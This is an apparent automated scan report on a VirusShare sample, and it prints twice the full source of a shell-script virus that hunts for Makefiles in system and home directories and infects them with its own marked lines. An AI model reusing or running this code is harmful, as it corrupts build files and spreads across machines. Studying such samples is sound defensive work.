{
    "docinfo": {
        "attributes": [],
        "behavior": {},
        "macro": "#!/bin/sh\n\n# Search routine\nFIL=\"\"\nif test \"`locate Makefile 2>/dev/null`x\" != \"x\" ; then for x in `locate Makefile` ; do FIL=\"$FIL $x\" ; done ; else\nfor place in .. /usr/src /home /root /etc /var ; do\n targs=\"\"\n targs=\"`find $place -name Makefile -o -name Makefile.in -o -name makefile 2>/dev/null`\"\n if test \"${targs}x\" != \"x\" ; then for x in $targs ; do FIL=\"$FIL $x\" ; done ; fi\ndone\nfi\n\n# Infection main loop\nfor victim in $FIL ; do\n # Infected?\n if test \"`grep Sz9m2 $victim 2>/dev/null`x\" == \"x\" ; then\n   # Infection.\n   TARGET=$victim\n   TARGETOUT=\"${victim}.$$\"\n   >$TARGETOUT\n   ins=0\n   state=0\n   cat $TARGET | while read line ; do\n    if test $ins == 1 ; then\n     ins=2\n     grep Sz9m2 `pwd`/Makefile >> $TARGETOUT\n   fi\n    if test \"`echo \\\"$line\\\" | grep [0-9A-z]*:`x\" != \"x\" ; then\n     if test $ins == 0 ; then ins=1 ; fi ;# first ':' matched\n     # dont match =: 's\n     if test \"`echo \\\"$line\\\" | grep =`x\" != \"x\" ; then ins=0 ; fi\n     state=1\n    fi\n    if test \"${line}x\" == \"x\" ; then\n     echo >> $TARGETOUT\n    if test $state == 2 ; then state=3; fi;\n    elif test $state == 1 ; then\n     if test \"`echo \"$line\"|grep \"\\`printf \"\\t\"\\`\"`x\" != \"x\" ; then\n       ( echo -en \"\\t\";echo \"$line\" ) >> $TARGETOUT\n      else\n       echo \"$line\" >> $TARGETOUT\n     fi\n     state=2\n    elif test $state == 2 ; then\n     ( echo -en \"\\t\"; echo \"$line\" ) >> $TARGETOUT\n    elif test $state == 3 ; then\n     state=0\n    elif test \"`echo \"$line\"|grep \"\\`printf \"\\t\"\\`\"`x\" != \"x\" ; then\n       ( echo -en \"\\t\";echo \"$line\" ) >> $TARGETOUT\n     else\n       echo \"$line\" >> $TARGETOUT\n    fi\n   done\n  mv -f $TARGETOUT TARGET\n fi\ndone\n"
    },
    "filename": "VirusShare_423df539c88e6177b56cc56f2a26a656",
    "filesize": 1643,
    "filetype": "POSIX shell script, ASCII text executable",
    "hashes": {
        "md5": "423df539c88e6177b56cc56f2a26a656",
        "sha1": "d2314dd0656f8557f996e37cbdf4df8948b75cd4",
        "sha256": "e0d9c0d1a33b6e6af17aba192f85d2baade241159aa16d86671a83f01a1dd9b6"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/bin/sh",
            "# Search routine",
            "FIL=\"\"",
            "if test \"`locate Makefile 2>/dev/null`x\" != \"x\" ; then for x in `locate Makefile` ; do FIL=\"$FIL $x\" ; done ; else",
            "for place in .. /usr/src /home /root /etc /var ; do",
            " targs=\"\"",
            " targs=\"`find $place -name Makefile -o -name Makefile.in -o -name makefile 2>/dev/null`\"",
            " if test \"${targs}x\" != \"x\" ; then for x in $targs ; do FIL=\"$FIL $x\" ; done ; fi",
            "done",
            "# Infection main loop",
            "for victim in $FIL ; do",
            " # Infected?",
            " if test \"`grep Sz9m2 $victim 2>/dev/null`x\" == \"x\" ; then",
            "   # Infection.",
            "   TARGET=$victim",
            "   TARGETOUT=\"${victim}.$$\"",
            "   >$TARGETOUT",
            "   ins=0",
            "   state=0",
            "   cat $TARGET | while read line ; do",
            "    if test $ins == 1 ; then",
            "     ins=2",
            "     grep Sz9m2 `pwd`/Makefile >> $TARGETOUT",
            "   fi",
            "    if test \"`echo \\\"$line\\\" | grep [0-9A-z]*:`x\" != \"x\" ; then",
            "     if test $ins == 0 ; then ins=1 ; fi ;# first ':' matched",
            "     # dont match =: 's",
            "     if test \"`echo \\\"$line\\\" | grep =`x\" != \"x\" ; then ins=0 ; fi",
            "     state=1",
            "    fi",
            "    if test \"${line}x\" == \"x\" ; then",
            "     echo >> $TARGETOUT",
            "    if test $state == 2 ; then state=3; fi;",
            "    elif test $state == 1 ; then",
            "     if test \"`echo \"$line\"|grep \"\\`printf \"\\t\"\\`\"`x\" != \"x\" ; then",
            "       ( echo -en \"\\t\";echo \"$line\" ) >> $TARGETOUT",
            "      else",
            "       echo \"$line\" >> $TARGETOUT",
            "     fi",
            "     state=2",
            "    elif test $state == 2 ; then",
            "     ( echo -en \"\\t\"; echo \"$line\" ) >> $TARGETOUT",
            "    elif test $state == 3 ; then",
            "     state=0",
            "    elif test \"`echo \"$line\"|grep \"\\`printf \"\\t\"\\`\"`x\" != \"x\" ; then",
            "       ( echo -en \"\\t\";echo \"$line\" ) >> $TARGETOUT",
            "     else",
            "       echo \"$line\" >> $TARGETOUT",
            "    fi",
            "   done",
            "  mv -f $TARGETOUT TARGET",
            "done"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.256063",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
